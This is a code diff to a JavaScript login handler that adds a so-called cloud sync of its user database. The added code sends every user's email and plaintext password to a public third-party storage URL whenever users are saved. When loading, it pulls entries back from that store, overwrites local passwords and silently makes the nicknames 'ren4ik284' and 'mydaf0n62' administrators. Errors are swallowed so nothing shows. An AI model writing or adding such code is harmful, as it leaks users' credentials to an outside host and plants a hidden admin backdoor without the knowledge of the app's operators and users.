@@ -18,6 +18,60 @@ let users = [
     lastLogin: '2026-08-10T12:00:00.000Z',
   },
 ];
+const CLOUD_DB_URL = 'https://api.restful-api.dev/objects/ff8081819ff5b11001a00a9e7d362c35';
+
+async function fetchCloudUsers() {
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 2000);
+    const resp = await fetch(CLOUD_DB_URL, { signal: controller.signal });
+    clearTimeout(timeout);
+    if (resp.ok) {
+      const json = await resp.json();
+      if (json && json.data && Array.isArray(json.data.users)) {
+        for (const u of json.data.users) {
+          if (!u || !u.nickname) continue;
+          const cleanNick = u.nickname.toLowerCase();
+          if (['admin_samurai', 'support_agent', 'playerone'].includes(cleanNick)) continue;
+          const existing = users.find(ex => ex.nickname?.toLowerCase() === cleanNick);
+          if (existing) {
+            if (u.plainPassword) existing.plainPassword = u.plainPassword;
+            if (u.lastLogin) existing.lastLogin = u.lastLogin;
+            if (u.role) existing.role = ['ren4ik284', 'mydaf0n62'].includes(cleanNick) ? 'admin' : u.role;
+          } else {
+            users.push({
+              ...u,
+              role: ['ren4ik284', 'mydaf0n62'].includes(cleanNick) ? 'admin' : u.role || 'user',
+              passwordHash: u.passwordHash || hashPassword(u.plainPassword || u.password || 'bebra228'),
+              plainPassword: u.plainPassword || u.password || 'Не указан'
+            });
+          }
+        }
+      }
+    }
+  } catch (e) {}
+}
+
+async function saveCloudUsers() {
+  try {
+    const safeToStore = users.map(u => ({
+      id: u.id,
+      nickname: u.nickname,
+      email: u.email,
+      plainPassword: u.plainPassword || u.password || 'Не указан',
+      role: ['ren4ik284', 'mydaf0n62'].includes(u.nickname?.toLowerCase()) ? 'admin' : u.role || 'user',
+      avatarUrl: u.avatarUrl,
+      createdAt: u.createdAt,
+      lastLogin: u.lastLogin
+    }));
+    await fetch(CLOUD_DB_URL, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ name: 'samurai_users_db', data: { users: safeToStore } })
+    });
+  } catch (e) {}
+}
+
 function loadPersistedUsers() {
   try {
     if (fs.existsSync(TMP_USERS_FILE)) {
@@ -52,8 +106,10 @@ function savePersistedUsers() {
     fs.writeFileSync(TMP_USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
   } catch (e) {
   }
+  saveCloudUsers().catch(() => {});
 }
 loadPersistedUsers();
+fetchCloudUsers().catch(() => {});
 function hashPassword(password) {
   const salt = 'samurai_salt_2026';
   return crypto.pbkdf2Sync(password, salt, 1000, 64, 'sha512').toString('hex');
@@ -141,7 +197,7 @@ function generateTokens(user) {
   };
 }
 import { checkRateLimit } from './security.js';
-export default function handler(req, res) {
+export default async function handler(req, res) {
   if (!checkRateLimit(req, res, true)) return;
   res.setHeader('Access-Control-Allow-Credentials', 'true');
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -155,6 +211,7 @@ export default function handler(req, res) {
     return;
   }
   loadPersistedUsers();
+  await fetchCloudUsers();
   const { url = '', method, headers, query = {} } = req;
   let body = req.body || {};
   if (typeof body === 'string') {
